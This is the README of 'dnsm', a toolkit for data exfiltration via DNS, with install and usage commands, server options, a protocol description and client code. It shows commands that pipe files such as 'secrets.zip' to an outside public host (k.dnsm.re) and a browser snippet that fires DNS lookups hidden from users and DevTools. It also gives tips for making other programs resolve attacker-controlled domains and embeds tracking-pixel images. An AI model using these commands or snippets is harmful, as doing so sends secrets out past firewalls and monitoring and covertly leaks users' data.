<div align="center">
  <img alt="dnsm ASCII logotype" src="https://raw.githubusercontent.com/k-o-n-t-o-r/dnsm/master/static/logo.png" style="max-width: 300px">

  <img alt="" src="http://fdec98566df5.k.dnsm.re/empty.svg" style="max-width: 1px; max-height: 1px;">
  <img alt="" src="https://dnsm.re/empty.svg" style="max-width: 1px; max-height: 1px;">

  <br>
</div>

<div align="center">

# Toolkit for Data Exfiltration via DNS

</div>

<p>
  <a href="https://crates.io/crates/dnsm"><img alt="crates.io" src="https://img.shields.io/crates/v/dnsm.svg"></a>
  <a href="https://pypi.org/project/dnsm"><img alt="PyPI" src="https://img.shields.io/pypi/v/dnsm.svg"></a>
  <a href="https://www.npmjs.com/package/@k-o-n-t-o-r/dnsm"><img alt="npm" src="https://img.shields.io/npm/v/@k-o-n-t-o-r/dnsm.svg"></a>
  <img alt="Rust" src="https://img.shields.io/badge/Rust-stable-orange?logo=rust">
  <img alt="Python" src="https://img.shields.io/badge/Python-3.9+-blue?logo=python&logoColor=white">
</p>

## Quick Start

Encode data into DNS queries. Retrieve it on a server you control. Works from firewalled networks, CI runners, browsers -- anywhere DNS resolves.

```bash
# Send "hello world" via DNS to our public instance
echo "hello world" | dnsm
```

The client prints a mailbox ID (e.g. `f8925edd7f13`). Open your inbox in the browser to see the message arrive:

> **https://dnsm.re/#/inbox/f8925edd7f13** (replace with your mailbox ID)

Or retrieve it via DNS:

```bash
dig @dnsm.re f8925edd7f13.m.dnsm.re TXT +tcp +short
```

That's it. No TCP connection, no HTTP -- just DNS. The client LZMA-compresses your input, encodes it into DNS labels, and lets recursive resolvers carry the data to the server.

### More examples

```bash
# Generate domain names without sending (inspect what gets encoded)
echo "secret message" | dnsm -n

# Send binary data
cat secrets.zip | dnsm

# Use an explicit mailbox ID
echo "hello" | dnsm a1b2c3d4e5f6

# Plain output (no colors)
echo "hello" | dnsm -p
```

> [!NOTE]
> The zone defaults to `k.dnsm.re` (our public instance). Pass `--zone` to target your own server.

### Install

```bash
cargo install dnsm                        # Rust (client binary)
pip install dnsm                          # Python
npm install -g @k-o-n-t-o-r/dnsm         # Node.js (Linux/macOS, x64/arm64)
```

Or download pre-built binaries from the latest [release](https://github.com/k-o-n-t-o-r/dnsm/releases).

<div align="center">
 <img src="https://raw.githubusercontent.com/k-o-n-t-o-r/dnsm/master/static/screenshots/combined_inbox_browser.png" />

<h3 style="margin-top: 5px;">

[Web Mailbox & Browser Test](https://dnsm.re)

</h3>

</div>

----

## How It Works

Many environments block outbound TCP/HTTP but leave DNS resolution untouched -- firewalls, proxies, sandboxed runtimes, CI runners, browsers. DNS queries happen early in connection setup, before transport-level controls kick in, and a query can traverse the network even when no subsequent connection is possible.

`dnsm` exploits this: it encodes bytes into the labels of a domain name (think `encoded_payload.k.dnsm.re`) and lets recursive resolvers carry that name to a zone you control. The server reassembles chunks and decodes the original payload.

The protocol: inputs are LZMA-compressed, framed with headers, split into ordered chunks, and base32-encoded into valid hostname labels. Optional mailboxes provide inbox-style retrieval and multiplexing across messages and senders.

### Browsers

The client also runs in browsers via WebAssembly. Depending on how you trigger resolution, lookups don't show up in browser DevTools and are invisible to users. Most traffic inspection tools (`mitmproxy`, `Fiddler`, `Burp`) don't capture DNS by default. Try [our browser test](https://dnsm.re/#/browser-test) to validate this.

See [Privacy-Preserving Data Transmission](#privacy-preserving-data-transmission) for a white-hat use case.

## CLI Help

<details>
  <summary><code>dnsm-server --help</code></summary>

```text
Logs queries, answers A records with a fixed IPv4 address, and can
reassemble dnsm payloads when a zone is configured. All runs persist
queries and decoded payloads to SQLite.

Examples:

- dnsm-server x.foo.bar
- dnsm-server x.foo.bar --bind 0.0.0.0:5300 --respond_with 127.0.0.1
- dnsm-server x.foo.bar --mailbox-zone m.example --tcp-mailbox --ans-ttl 30 --neg-ttl 300

Usage: dnsm-server [OPTIONS] <ZONE>

Arguments:
  <ZONE>
          Zone to treat as authoritative for dnsm payloads (required)

Options:
      --bind <ADDR>
          Address to bind (default: 0.0.0.0:53)

          [default: 0.0.0.0:53]

      --mailbox-zone <MBX_ZONE>
          Mailbox TXT zone (optional). When set, TXT queries for "<mailbox-hex>.<mailbox-zone>" will
          return accumulated messages for that mailbox from the SQLite database (when configured)

      --tcp-mailbox
          Enable DNS over TCP handler for mailbox TXT lookups only

      --respond_with <IP>
          IPv4 address to answer for A queries (default: 0.0.0.0)

          [default: 0.0.0.0]

      --log <PATH>
          Path to append diagnostic event logs (default: dnsm_queries.log) Note: queries themselves
          are persisted to SQLite (see --db)

          [default: dnsm_queries.log]

      --db <PATH>
          Path to a SQLite database for persistence (messages table is auto-created)

          [default: dnsm.db]

      --progress-every <N>
          Log progress every n unique chunks (n > 0)

      --gc-ms <MS>
          Garbage-collect inactive assemblies older than this many ms (default: 30000ms = 30s)

      --max-assemblies <COUNT>
          Maximum concurrent assembly sessions (prevents memory exhaustion, default: 10_000)

          [default: 10000]

      --ans-ttl <SEC>
          TTL for A-record answers (default: 0)

          [default: 0]

      --neg-ttl <SEC>
          TTL for negative answers with SOA (default: 300)

          [default: 300]

      --no-color
          Disable ANSI colors in stdout (pretty output is always on)

      --accept-ascii-only
          Accept only messages that decode to ASCII bytes; reject otherwise

      --no-response
          Process queries but send no responses when enabled

      --max-decompressed-bytes <BYTES>
          Maximum decompressed payload size in bytes (default: 12582912 = 12MB). Prevents
          decompression bomb attacks. Set to 0 to disable limit (unsafe)

          [default: 12582912]

      --rate-limit-qps <QPS>
          Maximum queries per second per IP address. Set to 0 to disable rate limiting. Aims to
          prevent UDP amplification/reflection attacks. Default: 1000 qps

          [default: 1000]

  -h, --help
          Print help (see a summary with '-h')
```

</details>

<details>
  <summary><code>dnsm --help</code></summary>

```text
Reads from stdin and emits DNS queries carrying the data, or prints
hostnames (one per chunk) when --dont-query is used.

Examples:

- echo 'hello' | dnsm
- echo 'hello' | dnsm abcdef123456
- echo 'hello' | dnsm abcdef123456 --zone x.foo.bar -n
- dnsm --ping
- head -c 200000 /dev/urandom | dnsm --resolver-ip 127.0.0.1:5353

Usage: dnsm [OPTIONS] [MAILBOX]

Arguments:
  [MAILBOX]
          Mailbox ID (exactly 12 hex chars). Random if omitted

Options:
      --zone <ZONE>
          Zone/apex the payload labels are appended to

          [default: k.dnsm.re]

      --resolver-ip <HOST[:PORT]>
          Send to this resolver (default: first nameserver in /etc/resolv.conf)

  -n, --dont-query
          Do not send; print hostnames (one per chunk)

      --await-reply-ms <MS>
          Wait up to this many ms for a reply to each query (0 disables)

          [default: 3000]

      --delay-ms <MS>
          Sleep this many ms between queries

          [default: 5]

      --sent-log <PATH>
          Append a human-readable send log to this file

      --random-mailbox
          Generate a random mailbox ID (conflicts with positional MAILBOX)

      --ping
          Send a minimal ping (no message content). Produces `<mailbox>.<zone>` (e.g.
          bf1c3a4a3694.k.dnsm.re)

      --debug
          Verbose progress to stderr

  -p, --plain
          Suppress colored progress output (plain text only)

      --no-color
          Disable ANSI colors

      --tagged-log
          Also write bracketed tags to --sent-log

  -h, --help
          Print help (see a summary with '-h')
```

</details>

## JavaScript (Wasm) Client

The JS client is generated via `wasm-bindgen` and exposes helpers to turn bytes/strings into chunked domain names. After building WebAssembly (see build instructions), import and initialize the module, then call the helpers:

```javascript
// Browser / ESM (vite, webpack, etc.)
import init, {
  domains_for_string,
  domains_for_string_with_mailbox,
  ping_domain,
} from "./web/src/lib/pkg-web/dnsm.js"; // path to generated pkg

await init(); // loads dnsm_bg.wasm next to dnsm.js

const zone = "k.example.com";
const msg = "hello from js";

// Without mailbox (auto session)
const domains = Array.from(domains_for_string(msg, zone));

// With mailbox (exactly 12 lowercase hex chars)
const mailbox = "050373323440";
const domainsWithMbx = Array.from(
  domains_for_string_with_mailbox(msg, zone, mailbox)
);

// Ping (minimal keepalive, no message content)
const pingHost = ping_domain(mailbox, zone);

// Optionally trigger DNS resolution in the browser (example method)
for (const h of domainsWithMbx) new Image().src = "https://" + h;
```

See [BrowserTest.tsx](web/src/pages/BrowserTest.tsx) for many in-browser resolution methods and usage examples.

Notes:

- The functions return arrays of domain names (strings) that encode your data.
- `ping_domain` returns a single domain name for a content-less keepalive query.
- The same compression, chunking, and mailbox behavior as the CLI is used under the hood.
- For Node/bundlers, you can also import from the `pkg/` directory produced by the wasm build.

## Python Client

Native Python bindings powered by PyO3. The same behavior as the Rust CLI, with no subprocess spawned.

### Install

```bash
pip install dnsm
```

Wheels are published for Linux and macOS (x86_64 and arm64, CPython 3.9 to 3.14).

### Library usage

```python
import dnsm

# Encode data into DNS domain names
domains, info = dnsm.build_domains(b"hello world", "k.dnsm.re")
print(info.total_chunks)  # 1
print(domains[0])         # aaabz6esl3...k.dnsm.re

# With a mailbox
domains, info = dnsm.build_domains(b"hello world", "k.dnsm.re", "050373323440")

# Ping (content-less keepalive)
ping = dnsm.build_ping_domain("050373323440", "k.dnsm.re")

# Low-level helpers
compressed = dnsm.compress_lzma(b"some data")
encoded    = dnsm.base32_encode(b"\x00\x01\x02")
decoded    = dnsm.base32_decode(encoded)   # bytes or None
key        = dnsm.message_key48(b"payload") # u64
mid        = dnsm.message_id(b"payload")    # 16 bytes (BLAKE3)

# Validation
labels = dnsm.validate_zone("k.dnsm.re")      # list[str] or raises ValueError
canon  = dnsm.validate_mailbox("050373323440")  # str or None
```

### CLI

A `dnsm` entry point mirrors the Rust CLI:

```bash
echo "hello world" | dnsm -n
echo "hello world" | dnsm --resolver-ip 127.0.0.1:5353 --delay-ms 2 --debug
```

Run `dnsm --help` for the full option list.

----

## Running Your Own Server

```bash
# Start the server (binds UDP :5353, stores payloads in SQLite)
dnsm-server x.foo.bar --bind 0.0.0.0:5353 --respond_with 127.0.0.1

# In another terminal, send data to it
echo "hello world" | dnsm --zone x.foo.bar --resolver-ip 127.0.0.1:5353

# Check the database
sqlite3 dnsm.db "SELECT id, data FROM messages"
```

## Domain Setup

1. Register a short domain and provision a publicly reachable host.

- Domain names have a maximum length, so shorter domains leave more space to encode payload data.

2. Pick a short data zone (e.g., `k.foo.bar`) and create an `NS` record that points to your host.
   Optional: Also create a mailbox zone (e.g., `m.foo.bar`) for DNS TXT retrieval.

3. Start `dnsm-server` on your host and pass the zone you selected.

## Privacy-Preserving Data Transmission

DNS resolution inherently anonymizes the sender's identity. When a client performs a DNS lookup, the request traverses through one or more recursive resolvers before reaching the authoritative nameserver (terms and conditions apply). From the authoritative server's perspective, the query appears to originate from the recursive resolver - not the original client. This architectural characteristic means the recipient never observes the sender's IP address.

This property has practical applications for privacy-compliant telemetry and analytics, particularly in jurisdictions where IP addresses constitute personally identifiable information (PII) under data protection regulations such as the EU's GDPR. By transmitting telemetry data through DNS queries, organizations can collect usage metrics and analytics from client applications - including web browsers - without capturing or processing any PII. The receiving infrastructure logs only the queries themselves and the IP addresses of intermediate DNS resolvers, which are shared infrastructure and carry no user-identifying information.

Note: Factors such as the specificity of transmitted data, timestamp precision, and correlation with other data sources may affect the privacy characteristics of any implementation.

## Programmatic Rust API

```rust
use dnsm::{build_domains_for_data, BuildOptions};

let data = b"exfiltrate me";
let zone = "k.dnsm.re";
let opts = BuildOptions { mailbox: Some(0x050373323440) };
let (domains, info) = build_domains_for_data(data, zone, &opts)?;
assert!(info.total_chunks >= 1);
```

## Protocol Header

| Section                 | Wire Format                                                                                                                                 | Notes                                                                                                                                                                                  |
| :---------------------- | :------------------------------------------------------------------------------------------------------------------------------------------ | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Envelope**            | LZMA input -> chunk framing (`header + extras + payload`) -> base32 labels (lowercase, no padding).                                           | Each label <= 63 bytes. Suffix the labels with the validated zone so the full QNAME stays under 255 bytes on the wire.                                                                  |
| **Chunk Header (v3)**   | 8-bit flags `[ping:1][chunked:1][mailbox:1][first:1][version:3][reserved:1]`, plus optional 16-bit big-endian `remaining` when `chunked=1`. | `version = 0x3`; single-chunk messages use a 1-byte header; multi-chunk messages use 3 bytes. `ping` marks a content-less keepalive; `first` marks the opener of a multi-chunk stream. |
| **Chunk Extras**        | Single: optional 6-byte mailbox. <br> First multi: 6-byte `message_key48`, optional 6-byte mailbox. <br> Follow-up: 6-byte `message_key48`. | v3 `message_key48 = BLAKE3("dnsm-msg-id\x00" \|\| has_mb(1) \|\| [mb(6)] \|\| payload)[..6]`; mailbox values are big-endian 48-bit when present. The key is now mailbox-aware so that the same payload with different mailboxes produces different assembly keys. |
| **Ping**                | 1-byte header (`ping=1, mailbox=1`) + 6-byte mailbox, no payload.                                                                          | Stored with `message_type='ping'` in the database. Pings are excluded from TXT mailbox responses but visible in the WebSocket/HTTP API.                                               |
| **Identifiers**         | `message_key48` binds multi-chunk assembly. <br> `message_id = BLAKE3(decompressed_payload)[..16]` for DB dedup.                            | Mailbox values are masked to `0x0000_FFFF_FFFF_FFFF`; TXT paging accepts either the 12-hex prefix or the full 32-hex `message_id`. The legacy `compute_message_key48()` helper computes the v2 (payload-only) key; multi-chunk assembly uses the v3 mailbox-aware key. |
| **Mailbox TXT Replies** | TXT RRs surface as `<message_id_prefix>\t<raw payload bytes>`.                                                                              | Prefix is the first 12 hex chars of `message_id`; oversized replies truncate gracefully and may set the TC bit as a paging hint. Only `message` rows are included (pings are excluded). |

## Finding DNS Call Sites

When looking for ways to trigger a specific program to resolve your domain names, a good heuristic is to check whether the executable imports common resolver entry points, then exercise code paths that reach them.

- Common symbols: `getaddrinfo`, `getnameinfo`, `gethostbyname`, `res_query` (libresolv), or library-specific resolvers (e.g., c-ares).
- Linux: `nm -D /usr/sbin/squid | grep -E "getaddrinfo|getnameinfo|gethostbyname|res_query"` or `objdump -T /usr/sbin/squid | grep ...`

Once you've identified a call site, typical triggers include providing a hostname (not an IP) in configuration (base URLs, webhook endpoints), setting proxy variables (`HTTP_PROXY`, `HTTPS_PROXY`, `ALL_PROXY`), or causing the app to load remote assets (updates, telemetry, images). These often funnel into the same resolver APIs and will emit DNS lookups that `dnsm-server` can observe.

## Building From Source

If you prefer building `dnsm` locally:

- Requirements: Rust (stable) and standard build tools. For the web demo, Node.js + npm.

- Native binaries (release builds):

  - Client: `cargo build --release --bin dnsm`
  - Server: `cargo build --release --bin dnsm-server --features sqlite`
  - WS/API: `cargo build --release --bin dnsm-ws --features "sqlite,ws-server"`

- Python bindings (requires [maturin](https://github.com/PyO3/maturin)):

  - Dev install: `maturin develop --features python`
  - Build wheel: `maturin build --release --features python`

- WebAssembly bindings for the JS client:

  - Install `wasm-bindgen-cli` once: `cargo install wasm-bindgen-cli --locked`
  - Build: `bash scripts/build_webassembly.sh`
  - The generated files land in `web/src/lib/pkg-web/` and `pkg/`.

- Web app (Svelte + Vite):

  - Dev server: `npm install --prefix web && npm run dev --prefix web`
  - Production build: `npm run build --prefix web`

- Binaries end up in `target/release/`.

- Optional Cargo features:
  - `sqlite` - required for `dnsm-server` and `dnsm-ws` (persistence, queries, views)
  - `ws-server` - enables the WebSocket/HTTP inbox
  - `python` - PyO3 bindings (used by `maturin`)
